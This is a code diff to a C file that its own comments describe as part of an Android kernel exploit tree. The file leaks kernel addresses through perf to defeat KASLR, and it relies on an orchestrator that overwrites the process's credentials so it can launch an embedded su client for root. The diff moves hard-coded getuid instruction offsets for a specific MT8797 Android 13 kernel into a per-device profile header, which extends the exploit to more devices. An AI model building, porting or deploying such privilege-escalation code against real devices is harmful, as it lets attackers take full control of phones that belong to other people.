@@ -22,6 +22,8 @@
 #include <time.h>
 #include <unistd.h>
 
+#include "perf_profile.h"
+
 /*
  * Native replacement for PerfKaslr.java + PerfRegsLeak.java.
  *
@@ -29,19 +31,11 @@
  * orchestrator writes this process's cred, then this same process launches
  * the embedded su client while it still owns the modified credentials.
  *
- * The offsets below are tied to the talih_pd2 MT8797 Android 13 4.19.191
- * kernel profile used by the rest of this exploit tree.
+ * Kernel instruction offsets are supplied by perf_profile.h for the selected
+ * device profile.
  */
-#define STATIC_KIMAGE_TEXT_BASE UINT64_C(0xffffff8008080000)
 #define KASLR_ALIGN             UINT64_C(0x00200000)
 #define KASLR_MASK              (KASLR_ALIGN - 1)
-
-#define GETUID_GENERIC_IP_OFF   UINT64_C(0x0001b124)
-#define GETUID_FIRST_OFF        UINT64_C(0x00053518)
-#define GETUID_TASK_IP_OFF      UINT64_C(0x0005351c)
-#define GETUID_CRED_FIRST_OFF   UINT64_C(0x00053520)
-#define GETUID_CRED_LAST_OFF    UINT64_C(0x00053528)
-#define GETUID_LAST_OFF         UINT64_C(0x00053534)
 
 #define PAGE_BYTES              4096U
 #define DATA_PAGES              64U
